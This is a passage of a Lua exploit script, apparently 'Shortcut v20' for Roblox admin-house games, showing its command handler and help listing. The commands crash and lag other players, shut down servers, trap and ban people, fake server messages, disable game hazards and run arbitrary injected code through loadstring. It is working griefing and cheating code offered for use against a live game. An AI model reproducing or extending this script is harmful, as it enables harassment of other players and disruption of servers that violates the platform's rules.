		u(e .. "super dog " .. string.sub(a6:lower(), 6) .. "," .. string.sub(a6:lower(), 6) .. "," .. string.sub(a6:lower(), 6) .. "," .. string.sub(a6:lower(), 6) .. "," .. string.sub(a6:lower(), 6) .. "," .. string.sub(a6:lower(), 6) .. "," .. string.sub(a6:lower(), 6) .. "," .. string.sub(a6:lower(), 6) .. "," .. string.sub(a6:lower(), 6) .. "," .. string.sub(a6:lower(), 6) .. "," .. string.sub(a6:lower(), 6) .. "," .. string.sub(a6:lower(), 6) .. "," .. string.sub(a6:lower(), 6) .. "," .. string.sub(a6:lower(), 6) .. "," .. string.sub(a6:lower(), 6))
		wait(3)
		u("kill " .. string.sub(a6:lower(), 6))
	end;
	if string.sub(a6:lower(), 0, 5) == e .. "trap" then
		logn("Trapped person!")
		u("freeze " .. string.sub(a6:lower(), 7))
		u("name " .. string.sub(a6:lower(), 7) .. " ")
		u("thaw " .. string.sub(a6:lower(), 7))
	end;
	if string.sub(a6:lower(), 0, 10) == e .. "blacklist" then
		u(f .. "lock " .. string.sub(a6:lower(), 12))
	end;
	if string.sub(a6:lower(), 0, 4) == e .. "lua" then
		loadstring(string.sub(a6:lower(), 6))()
	end;
	if string.sub(a6:lower(), 0, 12) == e .. "moveobbybox" then
		if a0 == false then
			logn("{Move.lua} Moving Obby Box")
			a0 = true;
			for ag, ae in pairs(Z["Obby Box"]:GetChildren()) do
				if ae.CFrame.Y < 500 then
					repeat
						wait()
					until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
					local a4 = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
					local a5 = true;
					task.spawn(function()
						while true do
							game:GetService('RunService').Heartbeat:Wait()
							game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
							a4.CFrame = ae.CFrame * CFrame.new(- 1 * ae.Size.X / 2 - game.Players.LocalPlayer.Character['Torso'].Size.X / 2, 0, 0)
							if not a5 then
								break
							end
						end
					end)
					task.spawn(function()
						while a5 do
							wait(.1)
							u('unpunish me')
						end
					end)
					wait(0.3)
					a5 = false;
					u("skydive me")
					wait(0.2)
					u("respawn me")
					wait(0.2)
				end
			end;
			wait(0.5)
			a0 = false;
			logn("{Move.lua} Done Moving Obby Box")
		else
			logn("{Move.lua} Already Moving, Please Wait")
		end
	end;
	if string.sub(a6:lower(), 0, 15) == e .. "moveobbybricks" then
		u(e .. "nok")
		wait(0.05)
		if a0 == false then
			logn("{Move.lua} Moving Obby Kill Bricks")
			a0 = true;
			for ag, ae in pairs(Z["Obby"]:GetChildren()) do
				if ae.CFrame.Y < 500 then
					repeat
						wait()
					until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
					local a4 = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
					local a5 = true;
					task.spawn(function()
						while true do
							game:GetService('RunService').Heartbeat:Wait()
							game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
							a4.CFrame = ae.CFrame * CFrame.new(- 1 * ae.Size.X / 2 - game.Players.LocalPlayer.Character['Torso'].Size.X / 2, 0, 0)
							if not a5 then
								break
							end
						end
					end)
					task.spawn(function()
						while a5 do
							wait(.1)
							u('unpunish me')
						end
					end)
					wait(0.3)
					a5 = false;
					u("skydive me")
					wait(0.2)
					u("respawn me")
					wait(0.75)
				end
			end;
			wait(0.5)
			a0 = false;
			logn("{Move.lua} Done Moving Obby Kill Bricks")
		else
			logn("{Move.lua} Already Moving, Please Wait")
		end
	end;
	if string.sub(a6:lower(), 0, 19) == e .. "movebuildingbricks" then
		if a0 == false then
			logn("{Move.lua} Moving Building Bricks")
			a0 = true;
			for ag, ae in pairs(Z["Building Bricks"]:GetChildren()) do
				if ae.CFrame.Y < 500 then
					repeat
						wait()
					until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
					local a4 = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
					local a5 = true;
					task.spawn(function()
						while true do
							game:GetService('RunService').Heartbeat:Wait()
							game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
							a4.CFrame = ae.CFrame * CFrame.new(- 1 * ae.Size.X / 2 - game.Players.LocalPlayer.Character['Torso'].Size.X / 2, 0, 0)
							if not a5 then
								break
							end
						end
					end)
					task.spawn(function()
						while a5 do
							wait(.1)
							u('unpunish me')
						end
					end)
					wait(0.30)
					a5 = false;
					u("skydive me")
					wait(0.2)
					u("respawn me")
					wait(0.2)
				end
			end;
			wait(0.5)
			a0 = false;
			logn("{Move.lua} Done Moving Building Bricks")
		else
			logn("{Move.lua} Already Moving, Please Wait")
		end
	end;
	if string.sub(a6:lower(), 0, 18) == e .. "moveadmindividers" then
		if a0 == false then
			logn("{Move.lua} Moving Admin Dividers")
			a0 = true;
			for ag, ae in pairs(Z["Admin Dividers"]:GetChildren()) do
				if ae.CFrame.Y < 500 then
					repeat
						wait()
					until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
					local a4 = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
					local a5 = true;
					task.spawn(function()
						while true do
							game:GetService('RunService').Heartbeat:Wait()
							game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
							a4.CFrame = ae.CFrame * CFrame.new(- 1 * ae.Size.X / 2 - game.Players.LocalPlayer.Character['Torso'].Size.X / 2, 0, 0)
							if not a5 then
								break
							end
						end
					end)
					task.spawn(function()
						while a5 do
							wait(.1)
							u('unpunish me')
						end
					end)
					wait(0.3)
					a5 = false;
					u("skydive me")
					wait(0.2)
					u("respawn me")
					wait(0.2)
				end
			end;
			wait(0.5)
			a0 = false;
			logn("{Move.lua} Done Moving Admin Dividers")
		else
			logn("{Move.lua} Already Moving, Please Wait")
		end
	end;
	if string.sub(a6:lower(), 0, 10) == e .. "movehouse" then
		if a0 == false then
			logn("{Move.lua} Moving House")
			a0 = true;
			for ag, ae in pairs(Z["Basic House"]:GetChildren()) do
				if ae.CFrame.Y < 500 then
					repeat
						wait()
					until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
					local a4 = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
					local a5 = true;
					task.spawn(function()
						while true do
							game:GetService('RunService').Heartbeat:Wait()
							game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
							a4.CFrame = ae.CFrame * CFrame.new(- 1 * ae.Size.X / 2 - game.Players.LocalPlayer.Character['Torso'].Size.X / 2, 0, 0)
							if not a5 then
								break
							end
						end
					end)
					task.spawn(function()
						while a5 do
							wait(.1)
							u('unpunish me')
						end
					end)
					wait(0.3)
					a5 = false;
					u("skydive me")
					wait(0.2)
					u("respawn me")
					wait(0.2)
				end
			end;
			wait(0.5)
			a0 = false;
			logn("{Move.lua} Done Moving House")
		else
			logn("{Move.lua} Already Moving, Please Wait")
		end
	end;
	if string.sub(a6:lower(), 0, 9) == e .. "movepads" then
		if a0 == false then
			logn("{Move.lua} Moving Admin Pads")
			a0 = true;
			for ag, ae in pairs(_.Pads:GetDescendants()) do
				if ae.Name == "Head" then
					if ae.CFrame.Y < 500 then
						repeat
							wait()
						until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
						local a4 = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
						local a5 = true;
						task.spawn(function()
							while true do
								game:GetService('RunService').Heartbeat:Wait()
								game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
								a4.CFrame = ae.CFrame * CFrame.new(- 1 * ae.Size.X / 2 - game.Players.LocalPlayer.Character['Torso'].Size.X / 2, 0, 0)
								if not a5 then
									break
								end
							end
						end)
						task.spawn(function()
							while a5 do
								wait(.1)
								u('unpunish me')
							end
						end)
						wait(0.3)
						a5 = false;
						u("skydive me")
						wait(0.2)
						u("respawn me")
						wait(0.2)
					end
				end
			end;
			wait(0.5)
			a0 = false;
			logn("{Move.lua} Done Moving Admin Pads")
		else
			logn("{Move.lua} Already Moving, Please Wait")
		end
	end;
	if string.sub(a6:lower(), 0, 13) == e .. "moveresetpad" then
		if a0 == false then
			logn("{Move.lua} Moving Admin Reset Pad")
			a0 = true;
			if _.Regen.CFrame.Y < 500 then
				repeat
					wait()
				until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
				local a4 = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
				local a5 = true;
				task.spawn(function()
					while true do
						game:GetService('RunService').Heartbeat:Wait()
						game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
						a4.CFrame = _.Regen.CFrame * CFrame.new(- 1 * _.Regen.Size.X / 2 - game.Players.LocalPlayer.Character['Torso'].Size.X / 2, 0, 0)
						if not a5 then
							break
						end
					end
				end)
				task.spawn(function()
					while a5 do
						wait(.1)
						u('unpunish me')
					end
				end)
				wait(0.3)
				a5 = false;
				u("skydive me")
				u("skydive me")
				u("skydive me")
				u("skydive me")
				u("skydive me")
				u("skydive me")
				wait(0.2)
				u("respawn me")
				wait(0.2)
			end;
			wait(0.5)
			a0 = false;
			logn("{Move.lua} Done Moving Admin Reset Pad")
		else
			logn("{Move.lua} Already Moving, Please Wait")
		end
	end;
	if string.sub(a6:lower(), 0, 14) == e .. "movebaseplate" then
		if a0 == false then
			logn("{Move.lua} Moving Basteplate")
			a0 = true;
			if Z.Baseplate.CFrame.Y < 500 then
				repeat
					wait()
				until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
				local a4 = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
				local a5 = true;
				task.spawn(function()
					while true do
						game:GetService('RunService').Heartbeat:Wait()
						game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
						a4.CFrame = Z.Baseplate.CFrame * CFrame.new(- 1 * Z.Baseplate.Size.X / 2 - game.Players.LocalPlayer.Character['Torso'].Size.X / 2, 0, 0)
						if not a5 then
							break
						end
					end
				end)
				task.spawn(function()
					while a5 do
						wait(.1)
						u('unpunish me')
					end
				end)
				wait(0.3)
				a5 = false;
				u("skydive me")
				wait(0.2)
				u("respawn me")
				wait(0.2)
			end;
			wait(0.5)
			a0 = false;
			logn("{Move.lua} Done Moving Basteplate")
		else
			logn("{Move.lua} Already Moving, Please Wait")
		end
	end;
	if string.sub(a6:lower(), 0, 15) == e .. "setspawnpoints" then
		local aH = string.sub(a6:lower(), 17)
		if a0 == false then
			logn("{Move.lua} Moving Admin Reset Pad")
			a0 = true;
			if Z.Spawn1.CFrame.Y < 500 then
				repeat
					wait()
				until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
				local a4 = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
				local a5 = true;
				task.spawn(function()
					while true do
						game:GetService('RunService').Heartbeat:Wait()
						game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
						a4.CFrame = Z.Spawn1.CFrame * CFrame.new(- 1 * Z.Spawn1.Size.X / 2 - game.Players.LocalPlayer.Character['Torso'].Size.X / 2, 0, 0)
						if not a5 then
							break
						end
					end
				end)
				task.spawn(function()
					while a5 do
						wait(.1)
						u('unpunish me')
					end
				end)
				wait(0.3)
				a5 = false;
				u("tp me " .. aH)
				wait(0.2)
				u("respawn me")
				wait(0.2)
			end;
			wait(0.5)
			a0 = false;
			logn("{Move.lua} Done Moving Admin Reset Pad")
		else
			logn("{Move.lua} Already Moving, Please Wait")
		end;
		if a0 == false then
			logn("{Move.lua} Moving Admin Reset Pad")
			a0 = true;
			if Z.Spawn2.CFrame.Y < 500 then
				repeat
					wait()
				until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
				local a4 = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
				local a5 = true;
				task.spawn(function()
					while true do
						game:GetService('RunService').Heartbeat:Wait()
						game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
						a4.CFrame = Z.Spawn2.CFrame * CFrame.new(- 1 * Z.Spawn2.Size.X / 2 - game.Players.LocalPlayer.Character['Torso'].Size.X / 2, 0, 0)
						if not a5 then
							break
						end
					end
				end)
				task.spawn(function()
					while a5 do
						wait(.1)
						u('unpunish me')
					end
				end)
				wait(0.3)
				a5 = false;
				u("tp me " .. aH)
				wait(0.2)
				u("respawn me")
				wait(0.2)
			end;
			wait(0.5)
			a0 = false;
			logn("{Move.lua} Done Moving Admin Reset Pad")
		else
			logn("{Move.lua} Already Moving, Please Wait")
		end;
		if a0 == false then
			logn("{Move.lua} Moving Admin Reset Pad")
			a0 = true;
			if Z.Spawn3.CFrame.Y < 500 then
				repeat
					wait()
				until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
				local a4 = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
				local a5 = true;
				task.spawn(function()
					while true do
						game:GetService('RunService').Heartbeat:Wait()
						game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
						a4.CFrame = Z.Spawn3.CFrame * CFrame.new(- 1 * Z.Spawn3.Size.X / 2 - game.Players.LocalPlayer.Character['Torso'].Size.X / 2, 0, 0)
						if not a5 then
							break
						end
					end
				end)
				task.spawn(function()
					while a5 do
						wait(.1)
						u('unpunish me')
					end
				end)
				wait(0.3)
				a5 = false;
				u("tp me " .. aH)
				wait(0.2)
				u("respawn me")
				wait(0.2)
			end;
			wait(0.5)
			a0 = false;
			logn("{Move.lua} Done Moving Admin Reset Pad")
		else
			logn("{Move.lua} Already Moving, Please Wait")
		end
	end;
	if string.sub(a6:lower(), 0, 13) == e .. "findresetpad" then
		local a4 = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
		a4.CFrame = _.Regen.CFrame
	end;
	if string.sub(a6:lower(), 0, 4) == e .. "nok" then
        pcall(function()
		game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump.TouchInterest:destroy()
        end)
        pcall(function()
		game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump1.TouchInterest:destroy()
        end)
        pcall(function()
		game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump2.TouchInterest:destroy()
        end)
        pcall(function()
		game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump3.TouchInterest:destroy()
        end)
        pcall(function()
		game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump4.TouchInterest:destroy()
        end)
        pcall(function()
		game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump5.TouchInterest:destroy()
        end)
        pcall(function()
		game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump6.TouchInterest:destroy()
        end)
        pcall(function()
		game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump7.TouchInterest:destroy()
        end)
        pcall(function()
		game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump8.TouchInterest:destroy()
        end)
        pcall(function()
		game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump9.TouchInterest:destroy()
        end)
	end;
	if string.sub(a6:lower(), 0, 6) == e .. "wkick" then
		local aC = string.sub(a6:lower(), 8)
		S = aC;
		R = true
	end;
	if string.sub(a6:lower(), 0, 10) == e .. "disablerc" then
		logn("Click 1 RC will now be disabled for EVERYONE!")
		u("gear me 0000000000000000004842207161")
	end;
	if string.sub(a6:lower(), 0, 10) == e .. "whitelist" then
		names = game.Players:GetChildren()
		local aC = string.sub(a6:lower(), 12)
		for ag, ae in pairs(names) do
			strlower = string.lower(ae.Name)
			sub = string.sub(strlower, 1, # aC)
			if aC == sub then
				user = ae.Name;
				table.insert(Whitelist, ae.Name)
				logn("Whitelisted " .. ae.Name)
			end
		end
	end;
	if string.sub(a6:lower(), 0, 7) == e .. "ignore" then
		names = game.Players:GetChildren()
		local aC = string.sub(a6:lower(), 9)
		for ag, ae in pairs(names) do
			strlower = string.lower(ae.Name)
			sub = string.sub(strlower, 1, # aC)
			if aC == sub then
				user = ae.Name;
				table.insert(Ignore, ae.Name)
				logn("Ignoring " .. ae.Name)
			end
		end
	end;
	if string.sub(a6:lower(), 0, 9) == e .. "unignore" then
		names = game.Players:GetChildren()
		local aC = string.sub(a6:lower(), 11)
		for ag, ae in pairs(names) do
			strlower = string.lower(ae.Name)
			sub = string.sub(strlower, 1, # aC)
			if aC == sub then
				user = ae.Name;
				for aD, aE in pairs(ignore) do
					if aE == ae.Name then
						table.remove(Ignore, aD)
						logn("Unignored " .. ae.Name)
					end
				end
			end
		end
	end;
	if string.sub(a6:lower(), 0, 12) == e .. "unwhitelist" then
		names = game.Players:GetChildren()
		local aC = string.sub(a6:lower(), 14)
		for ag, ae in pairs(names) do
			strlower = string.lower(ae.Name)
			sub = string.sub(strlower, 1, # aC)
			if aC == sub then
				user = ae.Name;
				for aD, aE in pairs(Whitelist) do
					if aE == ae.Name then
						table.remove(Whitelist, aD)
						logn("Unwhitelisted " .. ae.Name)
					end
				end
			end
		end
	end;
	if string.sub(a6:lower(), 0, 7) == e .. "prmify" then
		names = game.Players:GetChildren()
		local aC = string.sub(a6:lower(), 9)
		for ag, ae in pairs(names) do
			strlower = string.lower(ae.Name)
			sub = string.sub(strlower, 1, # aC)
			if aC == sub then
				user = ae.Name;
				table.insert(Admin, ae.Name)
				logn("Whitelisted " .. ae.Name)
			end
		end
	end;
	if string.sub(a6:lower(), 0, 8) == e .. "unadmin" then
		names = game.Players:GetChildren()
		local aC = string.sub(a6:lower(), 10)
		for ag, ae in pairs(names) do
			strlower = string.lower(ae.Name)
			sub = string.sub(strlower, 1, # aC)
			if aC == sub then
				user = ae.Name;
				for aD, aE in pairs(Admin) do
					if aE == ae.Name then
						table.remove(Admin, aD)
						logn("Unwhitelisted " .. ae.Name)
					end
				end
			end
		end
	end;
	if string.sub(a6:lower(), 0, 8) == e .. "allpads" then
		local aI = game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetChildren("Head")
		for ag, a9 in pairs(aI) do
			task.spawn(function()
				a9.PrimaryPart = a9:FindFirstChild("Head")
				local aJ = a9.PrimaryPart.CFrame;
				wait(0)
				a9.PrimaryPart.CanCollide = false;
				a9:SetPrimaryPartCFrame(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame)
				wait(0)
				a9:SetPrimaryPartCFrame(aJ)
				a9.PrimaryPart.CanCollide = true
			end)
		end
	end;
	if string.sub(a6:lower(), 0, 5) == e .. "cmds" then
		logn("Press F9 for the old shortcut v1 commands list")
            print("The default prefix is / because you're using Shortcut v2")
            print(e.."prmify (Plr) -- Give a player perm admin. It's basically the old /admin command only improved. Thank you Jotunn#1356 for making this all possible \n Also it's named prmify instead of permify so it won't interfere with /perm")
            print(e.."allpads -- Take all the admin pads!")
            print(e.."alltools -- hold all tools")
            print(e.."attach -- Attach to objects glitch. Outdated just use the keybind M if you're gonna do some attach work")
            print(e.."bangears (plr) -- Ban someone from using gears!")
            print(e.."bind (module) (key) -- Rebind a modules keybind")
            print(
                prefix ..
                    "bok (plr) -- Stop someone from dying from obby bricks AND from getting admin from admin pads for 2-5 minutes :)"
            )
            print(e.."clearlogs -- Spam logs")
            print(e.."clicktp -- Click tp tool")
            print(e.."cmds -- Print all commands to console")
            print(e.."control (Plr) -- Allow yourself to control someone(Kinda?)")
            print(e.."color house random -- Paint a set of objects a random colour! +New API (Instant)")
            print(e.."color clr random -- Paint a set of objects a random colour! +New API (Instant)")
            print(e.."color obby random -- Paint a set of objects a random colour! +New API (Instant)")
            print(e.."color obbybricks random -- Paint a set of objects a random colour! +New API (Instant)")
            print(e.."crash --gets you the vampire tool and waits until you hold it to spam size me 0.3 xd")
            print(e.."disguise -- Generate a random UserID then disguise yourself as them")
            print(e.."fps -- Enable an fps booster")
            print(e.."getpos -- Print position to CHAT.")
            print(e.."glitchshadow (Plr) -- Turn someone into a GLITCHED SHADOW(Char)")
            print(e.."haku -- Turn yourself into a dumbass")
            print(e.."headfloat (Plr) -- Make someones head float D:")
            print(e.."house -- Teleport to the house")
            print(
                e.."ignore -- Ignore them and let them attach to objects also enables antikill and antijail xd"
            )
            print(e.."infjump --Enable inf jump and yes jjsploit also has this but jjsploit is for the epick gamers")
            print(e.."lagall -- Hint spam basically")
            print(e.."lua (Code) -- Inject lua code without need to open your injector! ( Used for modding)")
            print(e.."moveadmindividers -- Move the admin deviders")
            print(e.."movebaseplate -- Move the baseplate")
            print(e.."movebuildingbricks -- move the building bricks")
            print(e.."movehouse -- Move the house")
            print(e.."moveobbybox -- Move the obby box")
            print(e.."moveobbybricks -- Remove the obby kill bricks")
            print(e.."movepads -- Move admin pads")
            print(e.."moveresetpad -- Super skydive the reset pad. Outdated by Hideregen but who cares it does the job for the normies")
            print(e.."nok -- No obby kill")
            print(e.."nonperm -- Undo the perm effect")
            print(e.."noob (Plr) -- Noobify but different")
            print(e.."ohnana -- Nana oh nana~")
            print(e.."padban (Plr) -- Ban someone from the pads")
            print(e.."pads -- Teleport to the pads")
            print(
                prefix ..
                    "perm -- Old perm"
            )
            print(e.."playbackspeed (Float) -- Add (Float) to the sound/music pitch (Client-sided)")
            print(e.."play (1-24) -- Play inbuilt music without an id :D. Also fun fact: None of them work anymore LMAO")
            print(e.."rat (Plr) -- Turn them into a smelly rat xd")
            print(e.."reg -- Regen the pads")
            print(e.."rej -- Rejoin command xd")
            print(e.."rocket (plr) -- Turn someone into a rocket D:")
            print(e.."rrej -- Rejoin a random server WITHOUT THE SHORTCUT HUB!")
            print(e.."rrocket (plr) -- Turn someone into a RAINBOW ROCKET D:")
            print(e.."sch -- Join a 5 player KAH server")
            print(e.."setspawnpoints (plr)-- Set the world spawn!. Outdated use //setspawn instead")
            print(e.."shortcutchat (Msg) -- Talk as 'Shortcut v2' ")
            print(e.."skydive -- Skydives you without admin")
            print(e.."sm (Msg) -- Talk as the server! (HintGUI)")
            print(e.."spam (cmd) -- /spam from scv1 is much slower than //spam. You can stop spamming with //stop or the keybind F")
            print(e.."spawn -- Teleport to spawn2")
            print(e.."stop -- Stop tesk spammer/normal spammer xd")
            print(e.."super (cmd) -- Does a command 100 times (//super of scv1 does it 69 times)")
            print(e.."tesk (plr) -- Good old tesk. Obsolete asf but works")
            print(e.."traplogs -- Trap a player named ogs")
            print(e.."trap (plr) -- Stop someone from moving")
            print(e.."tkick -- Attempt to crash someone. Old and outdated. But surprisingly works well and absolutely lags the fuck out of them.")
            print(e.."tool (1-5) (Plr) -- Get a tool!")
            print(e.."titan (Plr) -- Turn them into a massive titan D:")
            print(e.."unadmin (Plr) -- Remove someones temp perm")
            print(e.."unignore -- removes them from the ignore list")
            print(e.."unpadban (Plr) -- Unban seomeon from pads")
            print(e.."unwhitelist (Plr) -- Remove someones ability to use your commands. It has a delay so keep that in mind")
            print(e.."volume (Float) -- Add (Float) to the sound/music volume (Client-sided)")
            print(e.."whitelist (Plr) -- Let someone use your commands. Dangerous as they can kick you at anytime. I'll laugh when that happens but still")
            print(prefix .."wkick (plr) -- In early 2021 people would use this to attempt to kick people. It was always embarrassing to see but hey atleast it worked. It's slow and pointless nowadays")
            print("")
            print("----- Main commands(Recm) -----")
            print(e.."shutdown -- Shut the server down lol. It's been replaced with //shutdown just saying or use the GUI button")
            print(e.."srj -- Join the smallest server shortcut can find")
            print(e.."padban -- Ban a player from getting admin")
            print(e.."toggle (AntiName) -- Toggle an anti/main module")
            print(e.."upme -- Unpunish yourself if your not an admin xd. Replaced with //up")
            print("/lua (code here). You can run minified code with the lua command. Some variables are already pre-made like cht for chat based stuff and logn for notifications. \n You can forexample do cht('kill all');('reset all') in one command \n This command is almost essential if you want to chain premium start-up commands \n You can minify your code to make it compatible for the /lua command at > wannabe1337.xyz/code-lua-optimizer <")
            print("----- Modded commands -----")
            for i, v in pairs(api_commands) do
                print(prefix .. api_commands[i])
            end
            print("")
            print("----- Versions info -----")
            print("v20.0.1 -- Script entirely renewed and returned better than ever")
	    print("Did you know old Shortcut v14.1 is available in the discord server. Check the pins in #media.")
	    print("Shortcut v20.0.1 > Shortcut v14.1.")
        end
	if string.sub(a6:lower(), 0, 7) == e .. "set jp" then
		local aK = tonumber(string.sub(a6:lower(), 9))
		game.Players.LocalPlayer.Character.Humanoid.JumpPower = aK
	end;
	if string.sub(a6:lower(), 0, 3) == e .. "sm" then
		local aL = string.sub(a6:lower(), 5)
		hint("Server Message", aL)
	end;
	if string.sub(a6:lower(), 0, 11) == e .. "set lagall" then
		local aK = tonumber(string.sub(a6:lower(), 15))
		logn("Power is now being set to " .. string.sub(a6:lower(), 15))
		logn("Calculating, please wait.")
		local aM = ""
		for ag = aK, 1, - 1 do
			aM = aM .. M .. "g"
		end;
		N = aM
	end;
	if string.sub(a6:lower(), 0, 10) == e .. "antidelay" then
		antidelay = tonumber(string.sub(a6:lower(), 12))
	end;
	if string.sub(a6:lower(), 0, 7) == e .. "tool 1" then
		local a7 = string.sub(a6:lower(), 9)
		u("gear " .. a7 .. " 00000000000000000079446473")
	end;
	if string.sub(a6:lower(), 0, 7) == e .. "tool 2" then
		local a7 = string.sub(a6:lower(), 9)
		u("gear " .. a7 .. " 000000000000000000236438668")
	end;
	if string.sub(a6:lower(), 0, 7) == e .. "tool 3" then
		local a7 = string.sub(a6:lower(), 9)
		u("gear " .. a7 .. " 00000000000000000018474459")
	end;
	if string.sub(a6:lower(), 0, 7) == e .. "tool 4" then
		local a7 = string.sub(a6:lower(), 9)
		u("gear " .. a7 .. " 000000000000000000124126528")
	end;
	if string.sub(a6:lower(), 0, 7) == e .. "tool 5" then
		local a7 = string.sub(a6:lower(), 9)
		u("gear " .. a7 .. " 00000000000000000035683911")
	end;
	if string.sub(a6:lower(), 0, 14) == e .. "playbackspeed" then
		local aP = tonumber(string.sub(a6:lower(), 16))
		local aQ = game:GetService("Workspace").Terrain["_Game"].Folder.Sound;
		aQ.PlaybackSpeed = aP
	end;
	if string.sub(a6:lower(), 0, 7) == e .. "volume" then
		local aR = tonumber(string.sub(a6:lower(), 9))
		local aQ = game:GetService("Workspace").Terrain["_Game"].Folder.Sound;
		aQ.Volume = aR
	end;
	if string.sub(a6:lower(), 0, 9) == e .. "bangears" then
		u("gear me 00000000000000000082357101")
		wait(0.50)
		u(e .. "alltools")
		wait(0.50)
		names = game.Players:GetChildren()
		local aC = string.sub(a6:lower(), 11)
		for ag, ae in pairs(names) do
			strlower = string.lower(ae.Name)
			sub = string.sub(strlower, 1, # aC)
			if aC == sub then
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = ae.Character.HumanoidRootPart.CFrame;
				wait(0.25)
				local aS = ae.Name;
				workspace[game.Players.LocalPlayer.Name].PortableJustice.MouseClick:FireServer(workspace[aS])
				wait(0.25)
				u("reset " .. ae.Name)
			end
		end;
		wait(0.50)
		u("gear me 00000000000000000082357101")
		wait(0.50)
		u(e .. "alltools")
		wait(0.50)
		names = game.Players:GetChildren()
		local aC = string.sub(a6:lower(), 11)
		for ag, ae in pairs(names) do
			strlower = string.lower(ae.Name)
			sub = string.sub(strlower, 1, # aC)
			if aC == sub then
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = ae.Character.HumanoidRootPart.CFrame;
				wait(0.25)
				local aS = ae.Name;
				workspace[game.Players.LocalPlayer.Name].PortableJustice.MouseClick:FireServer(workspace[aS])
				wait(0.25)
				u("reset " .. ae.Name)
			end
		end
	end;

    if string.sub(a6:lower(), 0, 7) == e .. "retexture" then
        u("gear me 00000000000000000059190534")
        u("gear me 00000000000000000059190534")
        wait(1)
        for i, v in pairs(game.Players.LocalPlayer.Backpack:GetDescendants()) do
            if v:IsA "Tool" then
                game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
                wait(0.50)
                sendKeyPress("StatueStaffOfStonyJustice", true, "x") -- tell the server to press X
            end
        end
    end

	if string.sub(a6:lower(), 0, 19) == e .. "toggle anticrashvg" then
		g = not g;
		logn("anticrashVG is now set to " .. tostring(g))
	end;
	if string.sub(a6:lower(), 0, 24) == e .. "toggle antijailgearban" then
		h = not h;
		logn("antijailgearban is now set to " .. tostring(h))
	end;
	if string.sub(a6:lower(), 0, 21) == e .. "toggle antigrayscale" then
		i = not i;
		logn("antigrayscale is now set to " .. tostring(i))
	end;
	if string.sub(a6:lower(), 0, 16) == e .. "toggle antikill" then
		j = not j;
		logn("antikill is now set to " .. tostring(j))
	end;
	if string.sub(a6:lower(), 0, 17) == e .. "toggle antijail" then
		k = not k;
		logn("antijail is now set to " .. tostring(k))
	end;
	if string.sub(a6:lower(), 0, 19) == e .. "toggle mymusiconly" then
		l = not l;
		logn("mymusiconly is now set to " .. tostring(l))
	end;
	if string.sub(a6:lower(), 0, 16) == e .. "toggle antilogs" then
		n = not n;
		logn("antilogs is now set to " .. tostring(n))
	end;
	if string.sub(a6:lower(), 0, 13) == e .. "toggle mmoid" then
		m = tonumber(string.sub(a6:lower(), 15))
		logn("mymusiconly_id is now set to " .. tostring(m))
		l = true
	end;
	if string.sub(a6:lower(), 0, 17) == e .. "toggle superlogs" then
		o = not o;
		logn("Superlogs is now set to " .. tostring(o))
	end;
	if string.sub(a6:lower(), 0, 23) == e .. "toggle padsenforcement" then
		q = not q;
		logn("padsEnforcement is now set to " .. tostring(q))
	end;
	if string.sub(a6:lower(), 0, 24) == e .. "toggle everyonecommands" then
		p = not p;
		logn("everyonecommands is now set to " .. tostring(p))
	end;
	if string.sub(a6:lower(), 0, 18) == e .. "toggle antiattach" then
		r = not r;
		logn("antiattach is now set to " .. tostring(r))
	end;
	if string.sub(a6:lower(), 0, 18) == e .. "toggle antivoid" then
		s = not s;
